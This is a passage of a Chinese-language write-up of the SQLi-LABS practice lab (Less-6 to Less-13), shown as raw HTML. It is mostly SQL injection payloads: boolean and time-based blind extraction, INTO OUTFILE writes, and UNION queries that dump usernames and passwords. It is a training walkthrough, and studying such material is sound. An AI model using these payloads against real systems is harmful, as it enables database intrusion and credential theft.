class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>u<span class="string">&#x27;,1,0) --+</span></span><br></pre></td></tr></table></figure><h2 id="Less-6-双查询双引号字符串"><a href="#Less-6-双查询双引号字符串" class="headerlink" title="Less-6 双查询双引号字符串"></a>Less-6 双查询双引号字符串</h2><ul><li>首先要找出注入点：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 正确</span><br><span class="line"><span class="number">1</span>&quot; and 1=1--+</span><br><span class="line"># 错误</span><br><span class="line">1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><ul><li>由于Less-6了Less-5注入方式是差不多所以我们就不重复Less-5的步骤直接执行最后的步骤：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;a&#x27;,1,0) --+</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;d&#x27;,1,0) --+</span><br><span class="line"></span><br><span class="line"># 查询第二位数据</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;b&#x27;,1,0) --+</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;u&#x27;,1,0) --+</span><br></pre></td></tr></table></figure><h2 id="Less-7-转储到outfile"><a href="#Less-7-转储到outfile" class="headerlink" title="Less-7 转储到outfile"></a>Less-7 转储到outfile</h2><ul><li>这里题目提醒我们要使用outfile</li></ul><p><img src="/../../images/SQLi-LABS/image-20210924201419355.png" alt="image-20210924201419355"></p><ul><li>首先我们尝试使用单引号看看会不会报错。经过测试会出现错误。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210924202801469.png" alt="image-20210924202801469"></p><ul><li>这次的错误信息没有给我很好提示，我们只能靠猜（由于我们前面已经知道该查询列数有三个）：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 错误</span><br><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> &quot;$id&quot; limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> (<span class="string">&#x27;$id&#x27;</span>) limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> (&quot;$id&quot;) limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 正确</span><br><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> ((<span class="string">&#x27;$id&#x27;</span>)) limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>我们可以靠上面猜测的SQL语句使用<code>outfile</code>。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;)) union select id,username,password from users into outfile &#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span>mysql.txt<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><h2 id="Less-8-Boolean单引号字符串"><a href="#Less-8-Boolean单引号字符串" class="headerlink" title="Less-8 Boolean单引号字符串"></a>Less-8 Boolean单引号字符串</h2><ul><li>传入id&#x3D;1，会返回下列数据。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210924213039528.png" alt="image-20210924213039528"></p><ul><li>现在我们尝试在id&#x3D;1后面加单引号，页面就没有返回数据（我们可以大胆猜测没返回数据应该是错误或找不到数据）。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210924214034556.png" alt="image-20210924214034556"></p><ul><li>我们可以大胆猜测数据该SQL语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">1</span>,<span class="number">0</span>;</span><br></pre></td></tr></table></figure><ul><li>使用<strong>and</strong>尝试是否可以注入。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 有返回信息</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1 --+</span></span><br><span class="line"><span class="string"># 没返回信息</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><ul><li>这里我们使用**if()<strong>函数和</strong>substr()**函数进行猜数据。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>a<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>d<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查询第二位数据</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>b<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>u<span class="string">&#x27;,1,0) --+</span></span><br></pre></td></tr></table></figure><h2 id="Less-9-基于时间单引号字符串"><a href="#Less-9-基于时间单引号字符串" class="headerlink" title="Less-9 基于时间单引号字符串"></a>Less-9 基于时间单引号字符串</h2><ul><li>首先是猜出SQL语句或者找出注入点：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 返回：You <span class="keyword">are</span> in...........</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 返回：You <span class="keyword">are</span> in...........</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span></span><br><span class="line"></span><br><span class="line"># 返回：You <span class="keyword">are</span> in...........</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 返回：You are in...........</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 进过多次尝试发现无论输入什么内容都是显示</span><br><span class="line"># 返回：You <span class="keyword">are</span> in...........</span><br></pre></td></tr></table></figure><ul><li>假设SQL语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>尝试使用sleep()函数进行注入：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span> <span class="string">&#x27;union select 1,2, sleep(3) --+</span></span><br></pre></td></tr></table></figure><ul><li>发现页面返回花费了3秒多的时间。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210926163416721.png" alt="image-20210926163416721"></p><ul><li>现在我们已经成功注入了。我们可以依靠Less-8的方法进行猜出数据。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>a<span class="string">&#x27;,sleep(3),0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>d<span class="string">&#x27;,sleep(3),0) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查询第二位数据</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>b<span class="string">&#x27;,sleep(3),0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>u<span class="string">&#x27;,sleep(3),0) --+</span></span><br></pre></td></tr></table></figure><h2 id="Less-10-基于时间双引号字符串"><a href="#Less-10-基于时间双引号字符串" class="headerlink" title="Less-10 基于时间双引号字符串"></a>Less-10 基于时间双引号字符串</h2><ul><li>由于这里的SQL语句应该和Less-9区别不大。猜测应该是如下所示：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> &quot;$id&quot; limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>直接将Less-9的注入成功的payload拿来使用：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;d&#x27;,sleep(3),0) --+</span><br></pre></td></tr></table></figure><ul><li>现在我们已经成功注入了。我们可以依靠Less-8的方法进行猜出数据。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;a&#x27;,sleep(3),0) --+</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;d&#x27;,sleep(3),0) --+</span><br><span class="line"></span><br><span class="line"># 查询第二位数据</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;b&#x27;,sleep(3),0) --+</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;u&#x27;,sleep(3),0) --+</span><br></pre></td></tr></table></figure><h2 id="Less-11-基于错误的字符串"><a href="#Less-11-基于错误的字符串" class="headerlink" title="Less-11 基于错误的字符串"></a>Less-11 基于错误的字符串</h2><p><img src="/../../images/SQLi-LABS/image-20210926165317443.png" alt="image-20210926165317443"></p><ul><li>尝试在username编辑框中输入**’admin**，然后就出现图中的错误。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210926165534419.png" alt="image-20210926165534419"></p><ul><li>现在我们可以猜出该SQL语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, ... <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li><p>接下来我们要完善我们猜测的SQL语句。目前我们只知道<code> and password = &#39;$password&#39; limit 0, 1;</code>前面的SQL语句还太清楚。</p></li><li><p>首先先把<code>and password = &#39;$password&#39; limit 0, 1</code>注释掉，然后在注释前面输入payload。</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;or+1=1+order+by+8--+&amp;passwd=admin&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=&#x27;</span><span class="keyword">or</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">order</span><span class="operator">+</span><span class="keyword">by</span><span class="operator">+</span><span class="number">4</span><span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;or+1=1+order+by+2--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><ul><li>从上面的结果我们发现该查询只有两个字段。</li><li>新增查询出当前使用的表是什么名称。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="string">&#x27;union+select+database(),((select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()))--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210926170831305.png" alt="image-20210926170831305"></p><ul><li>现在获取users表中的所有列名。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="string">&#x27;union+select+database(),((select+group_concat(column_name)+from+information_schema.columns+where+table_schema=database()and+table_name+=&#x27;</span>users<span class="string">&#x27;))--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210926171225012.png" alt="image-20210926171225012"></p><ul><li>现在我们已经知道该SQL语句应该为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username, password <span class="keyword">from</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>接下来我们就需要获取users表中的所有数据。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="string">&#x27;union+select+(select+group_concat(username)+from+users),(select+group_concat(password)+from+users)--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210926171549808.png" alt="image-20210926171549808"></p><h2 id="Less-12-基于错误-双引号-字符串"><a href="#Less-12-基于错误-双引号-字符串" class="headerlink" title="Less-12 基于错误-双引号-字符串"></a>Less-12 基于错误-双引号-字符串</h2><ul><li>使用<code>&quot;union+select+1,2--+</code>payload会出现错误。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;union select 1,2-- &quot;) and password=(&quot;admin&quot;) LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>然后发现双引号后面有有单引号，使用下列payload成功绕过。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>&quot;union+select+1,2--+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><ul><li>获取所有users表中所有的数据（获取数据库中的所有表和所有列可参照Less-11）。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>&quot;)union+select+(select+group_concat(username)+from+users),(select+group_concat(password)+from+users)--+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210926191535359.png" alt="image-20210926191535359"></p><h2 id="Less-13-双注入字符串带扭转"><a href="#Less-13-双注入字符串带扭转" class="headerlink" title="Less-13-双注入字符串带扭转"></a>Less-13-双注入字符串带扭转</h2><ul><li>使用单引号会触发如下错误信息：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> password<span class="operator">=</span>(<span class="string">&#x27;&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure><ul><li>我们可以猜测该SQL语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, ... <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> (<span class="string">&#x27;$username&#x27;</span>) <span class="keyword">and</span> password <span class="operator">=</span> (<span class="string">&#x27;$password&#x27;</span>) limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>获取users表中的所有数据：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="string">&#x27;)union+select+(select+group_concat(username)+from+users),(select+group_concat(password)+from+users)--+&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><ul><li><p>发现页面仅返回了一个flag.jpg图片。</p></li><li><p>接下来我们或利用二分法获取数据：</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;)and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;</span>a<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span>)<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;)and+1=if(substr((select+group_concat(username)+from+users),1,1)=&#x27;</span>d<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查询第二位数据</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span>)<span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span><span class="operator">+</span>group_concat(username)<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>admin<span 